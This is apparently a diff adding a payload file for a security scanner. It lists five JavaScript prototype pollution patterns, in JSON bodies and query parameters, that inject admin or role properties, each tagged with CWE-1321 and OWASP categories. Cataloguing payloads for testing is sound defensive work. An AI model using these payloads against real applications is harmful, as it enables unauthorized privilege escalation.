@@ -1,0 +1,51 @@
+# Prototype Pollution Payloads
+
+[[payloads]]
+id = "pp-001"
+name = "JSON Prototype Pollution"
+category = "PrototypePollution"
+pattern = "{\"__proto__\": {\"admin\": true}}"
+description = "JavaScript prototype pollution via __proto__"
+risk_level = "HIGH"
+cwe_id = "CWE-1321"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "pp-002"
+name = "Constructor Prototype Pollution"
+category = "PrototypePollution"
+pattern = "{\"constructor\": {\"prototype\": {\"admin\": true}}}"
+description = "Prototype pollution via constructor.prototype"
+risk_level = "HIGH"
+cwe_id = "CWE-1321"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "pp-003"
+name = "Multi-property Prototype Pollution"
+category = "PrototypePollution"
+pattern = "{\"__proto__\": {\"isAdmin\": true, \"role\": \"admin\"}}"
+description = "Prototype pollution with multiple properties"
+risk_level = "HIGH"
+cwe_id = "CWE-1321"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "pp-004"
+name = "Query Parameter Prototype Pollution"
+category = "PrototypePollution"
+pattern = "?__proto__[admin]=true"
+description = "Prototype pollution via URL query parameters"
+risk_level = "HIGH"
+cwe_id = "CWE-1321"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "pp-005"
+name = "Constructor Query Prototype Pollution"
+category = "PrototypePollution"
+pattern = "?constructor[prototype][admin]=true"
+description = "Prototype pollution via constructor in query parameters"
+risk_level = "HIGH"
+cwe_id = "CWE-1321"
+owasp_category = "A03:2021"
